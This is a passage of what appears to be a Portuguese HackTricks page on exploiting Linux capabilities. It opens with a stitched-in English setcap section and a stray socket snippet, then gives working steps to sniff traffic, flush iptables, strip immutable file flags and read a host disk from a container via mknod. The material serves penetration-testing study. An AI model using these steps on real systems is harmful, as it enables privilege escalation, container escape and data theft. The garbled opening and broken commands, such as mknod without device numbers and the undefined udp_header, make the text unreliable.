$ getpcaps <pid>
```

To list the capabilities of a file, you can use the `getcap` command:

```bash
$ getcap <file>
```

## Add Capabilities

To add capabilities to a file, you can use the `setcap` command:

```bash
$ setcap <capability> <file>
```

For example, to add the `CAP_NET_RAW` capability to the `ping` command:

```bash
$ sudo setcap cap_net_raw+ep /bin/ping
```

## Remove Capabilities

To remove capabilities from a file, you can use the `setcap` command with the `-r` option:

```bash
$ sudo setcap -r <capability> <file>
```

For example, to remove the `CAP_NET_RAW` capability from the `ping` command:

```bash
$ sudo setcap -r cap_net_raw /bin/ping
```

## References

- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Linux Capabilities in Practice](https://www.redhat.com/sysadmin/linux-capabilities-practice)
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que um processo seja capaz de **criar tipos de soquetes RAW e PACKET** para os namespaces de rede disponíveis. Isso permite a geração e transmissão arbitrária de pacotes através das interfaces de rede expostas. Em muitos casos, essa interface será um dispositivo Ethernet virtual que pode permitir que um contêiner malicioso ou **comprometido falsifique** **pacotes** em vários níveis de rede. Um processo malicioso ou contêiner comprometido com essa capacidade pode injetar em uma ponte upstream, explorar o roteamento entre contêineres, ignorar os controles de acesso à rede e, de outra forma, interferir na rede do host se um firewall não estiver em vigor para limitar os tipos e conteúdos de pacotes. Finalmente, essa capacidade permite que o processo se vincule a qualquer endereço nos namespaces disponíveis. Essa capacidade é frequentemente retida por contêineres privilegiados para permitir que o ping funcione usando soquetes RAW para criar solicitações ICMP a partir de um contêiner.

**Isso significa que é possível capturar tráfego.** Você não pode escalar privilégios diretamente com essa capacidade.

**Exemplo com binário**

Se o binário **`tcpdump`** tiver essa capacidade, você poderá usá-lo para capturar informações de rede.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Note que se o **ambiente** estiver fornecendo essa capacidade, você também pode usar o **`tcpdump`** para capturar o tráfego.

**Exemplo com binário 2**

O exemplo a seguir é um código em **`python2`** que pode ser útil para interceptar o tráfego da interface "**lo**" (**localhost**). O código é do laboratório "_The Basics: CAP-NET\_BIND + NET\_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite ao detentor da capacidade **modificar o firewall, tabelas de roteamento, permissões de soquete**, configuração de interface de rede e outras configurações relacionadas em interfaces de rede expostas. Isso também fornece a capacidade de **ativar o modo promíscuo** para as interfaces de rede anexadas e potencialmente farejar através de namespaces.

**Exemplo com binário**

Vamos supor que o **binário python** tenha essas capacidades.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Isso significa que é possível modificar os atributos do inode.** Você não pode escalar privilégios diretamente com essa capacidade.

**Exemplo com binário**

Se você descobrir que um arquivo é imutável e o python tiver essa capacidade, você pode **remover o atributo imutável e tornar o arquivo modificável:**
```python
#Check that the file is imutable
lsattr file.sh 
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Observe que geralmente esse atributo imutável é definido e removido usando:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite o uso da chamada de sistema `chroot(2)`. Isso pode permitir a fuga de qualquer ambiente `chroot(2)`, usando fraquezas e escapes conhecidos:

* [Como escapar de várias soluções chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: ferramenta de escape chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite o uso da chamada de sistema `reboot(2)`. Também permite a execução de um **comando de reinicialização** arbitrário via `LINUX_REBOOT_CMD_RESTART2`, implementado para algumas plataformas de hardware específicas.

Essa capacidade também permite o uso da chamada de sistema `kexec_load(2)`, que carrega um novo kernel de falha e, a partir do Linux 3.17, a `kexec_file_load(2)` que também carregará kernels assinados.

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) foi finalmente bifurcado no Linux 2.6.37 do `CAP_SYS_ADMIN` catchall, essa capacidade permite que o processo use a chamada de sistema `syslog(2)`. Isso também permite que o processo visualize endereços do kernel expostos via `/proc` e outras interfaces quando `/proc/sys/kernel/kptr_restrict` é definido como 1.

A configuração do sysctl `kptr_restrict` foi introduzida no 2.6.38 e determina se os endereços do kernel são expostos. Isso é padrão para zero (expondo endereços do kernel) desde o 2.6.39 no kernel vanilla, embora muitas distribuições configurem corretamente o valor como 1 (ocultar de todos, exceto uid 0) ou 2 (sempre ocultar).

Além disso, essa capacidade também permite que o processo visualize a saída do `dmesg`, se a configuração `dmesg_restrict` for 1. Finalmente, a capacidade `CAP_SYS_ADMIN` ainda é permitida para realizar operações de `syslog` por razões históricas.

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite um uso estendido do [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) permitindo a criação de algo que não seja um arquivo regular (`S_IFREG`), FIFO (pipe nomeado) (`S_IFIFO`) ou soquete de domínio UNIX (`S_IFSOCK`). Os arquivos especiais são:

* `S_IFCHR` (Arquivo especial de caracteres (um dispositivo como um terminal))
* `S_IFBLK` (Arquivo especial de bloco (um dispositivo como um disco)).

É uma capacidade padrão ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Essa capacidade permite a escalada de privilégios (por meio da leitura de disco completo) no host, sob as seguintes condições:

1. Ter acesso inicial ao host (não privilegiado).
2. Ter acesso inicial ao contêiner (privilegiado (EUID 0) e `CAP_MKNOD` efetivo).
3. Host e contêiner devem compartilhar o mesmo espaço de usuário.

**Passos:**

1. No host, como um usuário padrão:
   1. Obtenha o UID atual (`id`). Por exemplo: `uid=1000(não privilegiado)`.
   2. Obtenha o dispositivo que deseja ler. Por exemplo: `/dev/sda`
2. No contêiner, como `root`:
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. De volta ao host:
```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
O atacante agora pode ler, despejar e copiar o dispositivo /dev/sda de um usuário não privilegiado.

### CAP\_SETPCAP

**`CAP_SETPCAP`** é uma capacidade do Linux que permite a um processo **modificar os conjuntos de capacidades de outro processo**. Concede a capacidade de adicionar ou remover capacidades dos conjuntos de capacidades efetivas, herdáveis e permitidas de outros processos. No entanto, existem certas restrições sobre como essa capacidade pode ser usada.

Um processo com `CAP_SETPCAP` **só pode conceder ou remover capacidades que estão em seu próprio conjunto de capacidades permitidas**. Em outras palavras, um processo não pode conceder uma capacidade a outro processo se ele próprio não tiver essa capacidade. Essa restrição impede que um processo eleve os privilégios de outro processo além de seu próprio nível de privilégio.

Além disso, em versões recentes do kernel, a capacidade `CAP_SETPCAP` foi **ainda mais restrita**. Não permite mais que um processo modifique arbitrariamente os conjuntos de capacidades de outros processos. Em vez disso, **só permite que um processo reduza as capacidades em seu próprio conjunto de capacidades permitidas ou no conjunto de capacidades permitidas de seus descendentes**. Essa mudança foi introduzida para reduzir os riscos potenciais de segurança associados à capacidade.

Para usar `CAP_SETPCAP` de forma eficaz, você precisa ter a capacidade em seu conjunto de capacidades efetivas e as capacidades de destino em seu conjunto de capacidades permitidas. Você pode então usar a chamada do sistema `capset()` para modificar os conjuntos de capacidades de outros processos.

Em resumo, `CAP_SETPCAP` permite que um processo modifique os conjuntos de capacidades de outros processos, mas não pode conceder capacidades que ele próprio não possui. Além disso, devido a preocupações de segurança, sua funcionalidade foi limitada em versões recentes do kernel para permitir apenas a redução de capacidades em seu próprio conjunto de capacidades permitidas ou no conjunto de capacidades permitidas de seus descendentes.

## Referências

**A maioria desses exemplos foi retirada de alguns laboratórios de** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), então se você quiser praticar essas técnicas de privilégios elevados, recomendo esses laboratórios.

**Outras referências**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) é o evento de cibersegurança mais relevante da **Espanha** e um dos mais importantes da **Europa**. Com **a missão de promover o conhecimento técnico**, este congresso é um ponto de encontro fervilhante para profissionais de tecnologia e cibersegurança em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
